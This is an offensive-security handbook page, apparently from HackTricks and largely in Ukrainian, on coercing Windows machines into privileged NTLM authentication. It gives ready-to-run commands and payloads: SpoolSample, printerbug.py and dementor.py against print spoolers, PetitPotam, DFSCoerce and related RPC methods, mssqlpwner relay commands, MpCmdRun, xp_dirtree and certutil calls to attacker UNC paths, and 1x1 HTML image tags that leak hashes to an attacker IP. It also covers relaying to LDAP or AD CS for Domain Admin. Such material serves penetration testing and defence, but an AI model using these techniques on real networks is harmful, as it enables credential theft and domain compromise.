# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.

## Spooler Service Abuse

Якщо служба _**Print Spooler**_ **увімкнена**, ви можете використати вже відомі AD облікові дані, щоб **запитати** у print server Domain Controller оновлення про нові завдання друку і просто вказати йому **відправити сповіщення на певну систему**.\
Зверніть увагу: коли принтер відправляє сповіщення до довільної системи, він повинен **автентифікуватися перед** цією **системою**. Тому нападник може змусити службу _**Print Spooler**_ аутентифікуватися перед довільною системою, і служба **використає computer account** у цій аутентифікації.

### Пошук Windows-серверів у домені

Використовуючи PowerShell, отримайте список Windows-машин. Сервери зазвичай мають пріоритет, тому зосередимося на них:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Пошук служб Spooler, що слухають

За допомогою трохи модифікованого [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) від @mysmartlogin (Vincent Le Toux), перевірте, чи Spooler Service слухає:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Ви також можете використовувати rpcdump.py на Linux і шукати MS-RPRN Protocol
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Попросити сервіс аутентифікуватися проти довільного хоста

Ви можете скомпілювати [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
або використайте [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) або [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), якщо ви на Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Комбінування з Unconstrained Delegation

Якщо нападник уже скомпрометував комп’ютер з [Unconstrained Delegation](unconstrained-delegation.md), він може **змусити принтер аутентифікуватися до цього комп’ютера**. Через Unconstrained Delegation **TGT** **облікового запису комп’ютера принтера** буде **збережено в** **пам’яті** комп’ютера з Unconstrained Delegation. Оскільки нападник уже має контроль над цим хостом, він зможе **отримати цей квиток** і зловживати ним ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: Ці методи приймають параметри, які можуть містити UNC-путь (наприклад, `\\attacker\share`). Під час обробки Windows аутентифікується (в контексті машини/користувача) до цього UNC, що дозволяє захоплення або relay NetNTLM.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: ціль намагається відкрити вказаний шлях до backup лог-файлу і аутентифікується до контролюваного нападником UNC.
- Practical use: змусити активи Tier 0 (DC/RODC/Citrix/etc.) генерувати NetNTLM, а потім relay до AD CS кінцевих точок (сценарії ESC8/ESC11) або до інших привілейованих сервісів.

## PrivExchange

Атака `PrivExchange` є наслідком вразливості, знайденої в **Exchange Server `PushSubscription` feature**. Ця можливість дозволяє примусити Exchange server (будь-яким доменним користувачем з поштовою скринькою) аутентифікуватися до будь-якого клієнтом вказаного хоста по HTTP.

За замовчуванням **Exchange service runs as SYSTEM** і має надмірні привілеї (зокрема, має **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Цю вразливість можна використати для **ретрансляції інформації в LDAP та подальшого витягання бази даних NTDS домену**. У випадках, коли relay в LDAP неможливий, цю вразливість все ще можна використати для relay та аутентифікації до інших хостів у домені. Успішна експлуатація цієї атаки надає негайний доступ до Domain Admin, використовуючи будь-який автентифікований доменний обліковий запис.

## Inside Windows

Якщо ви вже всередині Windows-машини, ви можете змусити Windows підключитися до сервера, використовуючи привілейовані облікові записи за допомогою:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Або використайте цю іншу техніку: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Можна використати certutil.exe lolbin (виконуваний файл, підписаний Microsoft) для примусу NTLM-аутентифікації:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Через електронну пошту

Якщо ви знаєте **адресу електронної пошти** користувача, який заходить на машину, яку ви хочете скомпрометувати, ви можете просто надіслати йому **електронний лист з 1x1 зображенням**, наприклад
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
і коли він її відкриє, він спробує автентифікуватися.

### MitM

Якщо ви можете виконати MitM attack проти комп'ютера і inject HTML у сторінку, яку він переглядає, ви можете спробувати inject зображення, подібне до наведеного, у цю сторінку:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Інші способи примушування та фішингового отримання NTLM-автентифікації


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Злам NTLMv1

Якщо ви можете перехопити [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
_Пам'ятайте, що щоб зламати NTLMv1 вам потрібно встановити Responder challenge на "1122334455667788"_

## Посилання
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
